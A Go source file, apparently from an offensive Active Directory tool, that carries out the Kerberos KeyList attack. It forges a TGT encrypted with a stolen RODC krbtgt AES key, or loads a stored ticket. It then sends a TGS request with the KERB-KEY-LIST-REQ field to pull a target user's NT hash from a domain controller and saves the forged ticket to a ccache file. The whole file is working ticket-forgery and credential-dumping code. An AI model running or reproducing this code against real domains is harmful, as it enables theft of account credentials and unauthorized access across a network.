package krb

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// MS-KILE PA-DATA types (gokrb5 leaves 151–164 unassigned).
const (
	PA_KERB_KEY_LIST_REQ int32 = 161
	PA_KERB_KEY_LIST_REP int32 = 162
)

// RODCKvno is kvno = rodcNumber << 16 (MS-KILE KeyList / RODC TGT).
func RODCKvno(rodcNumber uint32) uint32 {
	return rodcNumber << 16
}

// KeyListOptions is the host KeyList MVP (AES RODC krbtgt key, or an existing TGT).
type KeyListOptions struct {
	RODCNumber uint32
	AESKeyHex  string
	User       string
	Domain     string
	KDC        string
	Ticket     string // store id or ccache path; skips RODC forge
	Dir        string
}

// KeyListResult is one NT hash from KERB-KEY-LIST-REP.
type KeyListResult struct {
	User   string
	NTHash string
	KVNO   uint32
	EType  int32
	Ticket TicketMeta
}

// ValidateKeyList refuses RC4 and missing RODC-forge fields.
func ValidateKeyList(opts KeyListOptions) (kvno uint32, err error) {
	if opts.Ticket != "" {
		return 0, nil
	}
	if opts.RODCNumber == 0 {
		return 0, fmt.Errorf("--rodc-no required (or --ticket)")
	}
	if opts.User == "" || opts.Domain == "" || opts.KDC == "" {
		return 0, fmt.Errorf("--user --domain --dc required")
	}
	key, err := parseAES256Key(opts.AESKeyHex)
	if err != nil {
		return 0, err
	}
	_ = key
	return RODCKvno(opts.RODCNumber), nil
}

func parseAES256Key(hexKey string) ([]byte, error) {
	hexKey = strings.TrimSpace(strings.ToLower(hexKey))
	if len(hexKey) == 32 {
		return nil, fmt.Errorf("--aes-file must be 32-byte AES256 hex (RC4 not offered)")
	}
	if len(hexKey) != 64 {
		return nil, fmt.Errorf("--aes-file must be 32-byte AES256 hex (RC4 not offered)")
	}
	b, err := hex.DecodeString(hexKey)
	if err != nil {
		return nil, fmt.Errorf("aes key hex: %w", err)
	}
	return b, nil
}

// MarshalKeyListReq is KERB-KEY-LIST-REQ ::= SEQUENCE OF Int32.
func MarshalKeyListReq(etypes []int32) ([]byte, error) {
	if len(etypes) == 0 {
		etypes = []int32{etypeID.RC4_HMAC}
	}
	return asn1.Marshal(etypes)
}

// UnmarshalKeyListRep is KERB-KEY-LIST-REP ::= SEQUENCE OF EncryptionKey.
func UnmarshalKeyListRep(b []byte) ([]types.EncryptionKey, error) {
	var keys []types.EncryptionKey
	if _, err := asn1.Unmarshal(b, &keys); err != nil {
		return nil, fmt.Errorf("KERB-KEY-LIST-REP: %w", err)
	}
	if len(keys) == 0 {
		return nil, fmt.Errorf("KERB-KEY-LIST-REP: empty")
	}
	return keys, nil
}

func marshalKeyListRep(keys []types.EncryptionKey) ([]byte, error) {
	return asn1.Marshal(keys)
}

func ntHashFromKeys(keys []types.EncryptionKey) (string, int32, error) {
	for _, k := range keys {
		if k.KeyType != etypeID.RC4_HMAC {
			continue
		}
		if len(k.KeyValue) != 16 {
			return "", k.KeyType, fmt.Errorf("rc4 key length %d (want 16)", len(k.KeyValue))
		}
		return hex.EncodeToString(k.KeyValue), k.KeyType, nil
	}
	return "", 0, fmt.Errorf("KERB-KEY-LIST-REP has no rc4_hmac (etype 23) key")
}

func keyListRepFromPA(pas []types.PAData) ([]types.EncryptionKey, bool, error) {
	for _, pa := range pas {
		if pa.PADataType != PA_KERB_KEY_LIST_REP {
			continue
		}
		keys, err := UnmarshalKeyListRep(pa.PADataValue)
		return keys, true, err
	}
	return nil, false, nil
}

// ForgeRODCTGT builds an AES256 TGT with RODC kvno (no placeholder hash).
func ForgeRODCTGT(opts KeyListOptions) (messages.Ticket, types.EncryptionKey, types.PrincipalName, error) {
	var none messages.Ticket
	kvno, err := ValidateKeyList(opts)
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, err
	}
	raw, err := parseAES256Key(opts.AESKeyHex)
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, err
	}
	et, err := crypto.GetEtype(etypeID.AES256_CTS_HMAC_SHA1_96)
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, err
	}
	session, err := types.GenerateEncryptionKey(et)
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, err
	}
	realm := Realm(opts.Domain)
	user := samOnly(opts.User)
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)
	fl := types.NewKrbFlags()
	types.SetFlags(&fl, []int{flags.Forwardable, flags.Renewable, flags.PreAuthent})
	now := Now()
	etp := messages.EncTicketPart{
		Flags:     fl,
		Key:       session,
		CRealm:    realm,
		CName:     cname,
		Transited: messages.TransitedEncoding{},
		AuthTime:  now.Add(-10 * time.Minute),
		StartTime: now.Add(-10 * time.Minute),
		EndTime:   now.Add(10 * time.Hour),
		RenewTill: now.Add(7 * 24 * time.Hour),
	}
	plain, err := asn1.Marshal(etp)
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, fmt.Errorf("EncTicketPart: %w", err)
	}
	plain = asn1tools.AddASNAppTag(plain, asnAppTag.EncTicketPart)
	krbtgtKey := types.EncryptionKey{KeyType: etypeID.AES256_CTS_HMAC_SHA1_96, KeyValue: raw}
	ed, err := crypto.GetEncryptedData(plain, krbtgtKey, uint32(keyusage.KDC_REP_TICKET), int(kvno))
	if err != nil {
		return none, types.EncryptionKey{}, types.PrincipalName{}, fmt.Errorf("ticket enc-part: %w", err)
	}
	tkt := messages.Ticket{
		TktVNO:  5,
		Realm:   realm,
		SName:   sname,
		EncPart: ed,
	}
	return tkt, session, cname, nil
}

// KeyList forges (or loads) a TGT and TGS-REQs KERB-KEY-LIST for one NT hash.
func KeyList(opts KeyListOptions) (KeyListResult, error) {
	var out KeyListResult
	if opts.Ticket == "" {
		if _, err := ValidateKeyList(opts); err != nil {
			return out, err
		}
	} else if opts.KDC == "" {
		return out, fmt.Errorf("--dc required")
	}

	var (
		tgt   messages.Ticket
		skey  types.EncryptionKey
		cname types.PrincipalName
		realm string
		user  string
		kvno  uint32
	)
	if opts.Ticket != "" {
		_, path, err := LoadTicket(opts.Ticket, opts.Dir)
		if err != nil {
			return out, err
		}
		ct, ok := TGTFromCCacheMust(path)
		if !ok {
			return out, fmt.Errorf("ticket %s has no TGT", opts.Ticket)
		}
		tgt, skey, cname = ct.Ticket, ct.SessionKey, ct.CName
		realm = ct.CRealm
		if len(cname.NameString) > 0 {
			user = samOnly(cname.NameString[0])
		}
		kvno = uint32(tgt.EncPart.KVNO)
	} else {
		var err error
		tgt, skey, cname, err = ForgeRODCTGT(opts)
		if err != nil {
			return out, err
		}
		realm = Realm(opts.Domain)
		user = samOnly(opts.User)
		kvno = RODCKvno(opts.RODCNumber)
	}
	if opts.Domain == "" {
		opts.Domain = realm
	}
	if opts.KDC == "" {
		return out, fmt.Errorf("--dc required")
	}
	cfg, err := NewConfig(opts.Domain, opts.KDC)
	if err != nil {
		return out, err
	}
	cfg.LibDefaults.Forwardable = true
	cfg.LibDefaults.NoAddresses = true
	sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+Realm(opts.Domain))
	req, err := messages.NewTGSReq(cname, Realm(opts.Domain), cfg, tgt, skey, sname, false)
	if err != nil {
		return out, fmt.Errorf("KeyList TGS-REQ: %w", err)
	}
	types.SetFlag(&req.ReqBody.KDCOptions, flags.Forwardable)
	reqBytes, err := MarshalKeyListReq([]int32{etypeID.RC4_HMAC})
	if err != nil {
		return out, err
	}
	req.PAData = append(req.PAData, types.PAData{PADataType: PA_KERB_KEY_LIST_REQ, PADataValue: reqBytes})
	if err := restampTGSPAData(&req, tgt, skey); err != nil {
		return out, err
	}
	rep, err := tgsExchange(opts.KDC, req, tgt, skey)
	if err != nil {
		return out, fmt.Errorf("KeyList TGS: %w", err)
	}
	keys, found, err := keyListRepFromPA(rep.DecryptedEncPart.EncPAData)
	if err != nil {
		return out, err
	}
	if !found {
		keys, found, err = keyListRepFromPA(rep.PAData)
		if err != nil {
			return out, err
		}
	}
	if !found {
		return out, fmt.Errorf("TGS-REP has no KERB-KEY-LIST-REP (PA %d)", PA_KERB_KEY_LIST_REP)
	}
	nt, et, err := ntHashFromKeys(keys)
	if err != nil {
		return out, err
	}
	meta, err := storeKeyListTGT(opts, tgt, skey, cname, realm)
	if err != nil {
		return out, err
	}
	return KeyListResult{
		User:   user,
		NTHash: nt,
		KVNO:   kvno,
		EType:  et,
		Ticket: meta,
	}, nil
}

// TGTFromCCacheMust is TGTFromCCache with a path.
func TGTFromCCacheMust(path string) (CachedTicket, bool) {
	tickets, err := LoadCCacheTickets(path)
	if err != nil {
		return CachedTicket{}, false
	}
	return TGTFromCCache(tickets)
}

func storeKeyListTGT(opts KeyListOptions, tgt messages.Ticket, skey types.EncryptionKey, cname types.PrincipalName, realm string) (TicketMeta, error) {
	tktBytes, err := tgt.Marshal()
	if err != nil {
		return TicketMeta{}, err
	}
	now := Now()
	cc, err := WriteCCache(CCacheCred{
		ClientRealm: realm,
		Client:      cname.NameString,
		ServerRealm: tgt.Realm,
		Server:      tgt.SName.NameString,
		KeyType:     skey.KeyType,
		Key:         skey.KeyValue,
		AuthTime:    now,
		StartTime:   now,
		EndTime:     now.Add(10 * time.Hour),
		RenewTill:   now.Add(7 * 24 * time.Hour),
		Flags:       0,
		Ticket:      tktBytes,
	})
	if err != nil {
		return TicketMeta{}, err
	}
	dir := opts.Dir
	if dir == "" {
		dir = DefaultTicketDir()
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return TicketMeta{}, err
	}
	id, err := newTicketID()
	if err != nil {
		return TicketMeta{}, err
	}
	ccPath := filepath.Join(dir, id+".ccache")
	if err := os.WriteFile(ccPath, cc, 0o600); err != nil {
		return TicketMeta{}, err
	}
	meta := TicketMeta{
		ID:        id,
		Principal: strings.Join(cname.NameString, "/"),
		Realm:     realm,
		Server:    strings.Join(tgt.SName.NameString, "/") + "@" + tgt.Realm,
		EType:     skey.KeyType,
		End:       now.Add(10 * time.Hour),
		Source:    "keylist",
		CCache:    ccPath,
	}
	if err := writeMeta(dir, meta); err != nil {
		return TicketMeta{}, err
	}
	return meta, nil
}
